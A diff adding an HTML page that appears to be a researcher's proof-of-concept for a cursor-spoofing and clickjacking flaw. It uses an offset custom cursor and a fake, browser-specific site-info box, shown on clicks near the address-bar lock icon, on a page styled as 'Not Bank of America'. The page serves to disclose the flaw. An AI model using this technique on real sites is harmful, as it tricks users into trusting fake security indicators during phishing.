@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Not Bank of America</title>
+        <link rel="shortcut icon" href="favicon.ico">
+        <style>
+            html {
+                min-height: 100%;
+                cursor: url(cursor.png) 0 100, pointer;
+            }
+            body {
+                padding: 1em;
+                line-height: 150%;
+                min-height: 100%;
+                max-width: 800px;
+                margin: auto auto;
+                font-family: Arial, Helvetica, sans-serif;
+            }
+            .logo {
+                transform: rotate(180deg)
+            }
+            .box {
+                border: 1px solid gray;
+                border-radius: 0 0 5px 5px;
+                box-shadow: 0 2px 5px rgba(0, 0, 0, .25);
+                border-top: none;
+                position: absolute;
+                top: 0;
+                opacity: 0;
+                transition: opacity .15s;
+                z-index: 1;
+            }
+            figure {
+                margin: auto auto;
+                display: block;
+                text-align: center;
+                padding: 1em;
+            }
+            figure img {
+                border: 1px solid #CCC;
+            }
+        </style>
+        <script>
+            document.addEventListener("DOMContentLoaded", () => {
+
+                const ua = navigator.userAgent
+                const box = document.querySelector(".box")
+                const message = document.querySelector(".message")
+                const browserLabel = document.querySelector(".browser")
+                const browsers = {
+                    edge: {
+                        name: "Microsoft Edge",
+                        test: ua.includes("Edge"),
+                        message: "Edge does not appear to be affected."
+                    },
+                    brave: {
+                        name: "Brave",
+                        box: "brave-box.png",
+                        test: !ua.includes("Edge") && window.chrome && !window.chrome.csi,
+                        coords: { x: 190, y: 47 }
+                    },
+                    chrome: {
+                        name: "Google Chrome",
+                        box: "chrome-box.png",
+                        test: "chrome" in window && "csi" in window.chrome,
+                        coords: { x: 105, y: 79 }
+                    },
+                    firefox: {
+                        name: "Mozilla Firefox",
+                        box: "firefox-box.png",
+                        test: ua.includes('Firefox'),
+                        coords: { x: 266, y: 79 }
+                    }
+                }
+                const setup = browser => {
+                    if (browser.coords) {
+                        document.documentElement.addEventListener("click", event => {
+                            box.style.opacity = 0
+                            const { clientX: x, clientY: y } = event
+                            if (x > (0.8 * browser.coords.x) && x < (1.2 * browser.coords.x) &&
+                                y > (0.8 * browser.coords.y) && y < (1.2 * browser.coords.y)) {
+                                    box.src = browser.box
+                                    box.style.left = `${browser.coords.x * 0.8}px`
+                                    box.style.opacity = 1
+                                }
+                        })
+                    }
+                }
+
+                Object.values(browsers).forEach(browser => {
+                    if (browser.test) {
+                        browserLabel.textContent = browser.name
+                        if (browser.message) message.innerHTML = browser.message
+                        setup(browser)
+                    }
+                })
+            })
+        </script>
+    </head>
+    <body>
+        <img src="" class="box">
+        <p><img src="logo.svg" class="logo" alt="Not Bank of America" /></p>
+        <p>This <strong>is not</strong> the Bank of America site, but if I put in a few hours of work, it could look pretty similar.</p>
+        <p>This page uses a custom cursor (shown below) with an enormous offset. This confuses the user, causing their cursor to reside in an unexpected region of the screen.</p>
+        <figure>
+            <img src="cursor.png" alt="Fake Cursor">
+            <figcaption>The custom cursor graphic used on this page, shown with a gray border.</figcaption>
+        </figure>
+        <p>Due to the confused caused by this custom cursor, the user can be tricked into clicking certain elements, or trusting malicious interactions. Oddly enough, in some browsers, this cursor is displayed <em>outside of the viewport</em>. As a result, when the user thinks they're clicking the URL bar (or any other UI component), they may actually be clicking on the page.</p>
+        <p>To demonstrate one scenario, click the lock/info icon in your address bar.</p>
+        <p class="message">I think you are using <span class="browser"></span>.</p>
+        <p>Let's talk about this on Twitter: <a href="https://twitter.com/jonathansampson">@jonathansampson</a></p>
+    </body>
+</html>
